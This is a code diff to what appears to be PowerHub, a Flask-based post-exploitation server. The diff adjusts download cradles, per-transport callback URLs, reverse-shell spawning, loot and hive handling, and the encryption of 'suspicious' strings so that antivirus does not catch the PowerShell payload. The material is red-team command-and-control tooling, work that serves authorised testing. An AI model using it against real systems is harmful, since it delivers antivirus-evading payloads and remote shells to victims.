@@ -16,7 +16,7 @@ from flask_socketio import SocketIO  # , emit
 
 from powerhub.sql import get_clipboard, init_db, decrypt_hive, get_loot, \
         delete_loot
-from powerhub.stager import modules, build_cradle, callback_url, \
+from powerhub.stager import modules, build_cradle, callback_urls, \
         import_modules, webdav_url
 from powerhub.upload import save_file, get_filelist
 from powerhub.directories import UPLOAD_DIR, BASE_DIR, DB_FILENAME, \
@@ -139,9 +139,7 @@ def hub():
 @requires_auth
 def receiver():
     context = {
-        #  "dl_str": build_cradle(flavor='reverse_shell',
-        #                       need_proxy=need_proxy,
-        #                       need_tlsv12=need_tlsv12),
+        "dl_str": build_cradle(request.args, flavor='reverse_shell'),
         "SSL": args.SSL_KEY is not None,
         "shells": shell_receiver.active_shells(),
         "AUTH": args.AUTH,
@@ -304,6 +302,7 @@ def payload_m():
 @app.route('/0')
 def payload_0():
     """Load 0th stage"""
+
     # these are possibly 'suspicious' strings to be used in the powershell
     # payload. we don't want AV to detect them.
     encrypted_strings = [
@@ -348,7 +347,8 @@ def payload_0():
         exec_clipboard_entry = ""
     context = {
         "modules": modules,
-        "callback_url": callback_url,
+        "callback_url": callback_urls[request.args['t']],
+        "transport": request.args['t'],
         "key": KEY,
         "strings": encrypted_strings,
         "symbol_name": symbol_name,
@@ -397,7 +397,7 @@ def hub_modules():
                     "powershell/modules.ps1",
                     **context,
     ).encode()
-    result = b64encode(encrypt(compress(result), KEY))
+    result = b64encode(encrypt((result), KEY))
     return Response(result, content_type='text/plain; charset=utf-8')
 
 
@@ -418,12 +418,11 @@ def payload_l():
 
 @app.route('/dlcradle')
 def dlcradle():
-    #  global need_proxy, need_tlsv12
     try:
         return build_cradle(request.args)
-    except BadRequestKeyError:
+    except BadRequestKeyError as e:
         log.error("Unknown key, must be one of %s" % str(request.args))
-        return ('Error', 500)
+        return (str(e), 500)
 
 
 @app.route('/u', methods=["POST"])
@@ -511,7 +510,10 @@ def reload_modules():
 def reverse_shell():
     """Spawn a reverse shell"""
     context = {
-        "dl_cradle": build_cradle().replace('$K', '$R'),
+        "dl_cradle": build_cradle(
+            request.args,
+            flavor="reverse_shell",
+        ).replace('$K', '$R'),
         "IP": args.URI_HOST,
         "delay": 10,  # delay in seconds
         "lifetime": 3,  # lifetime in days
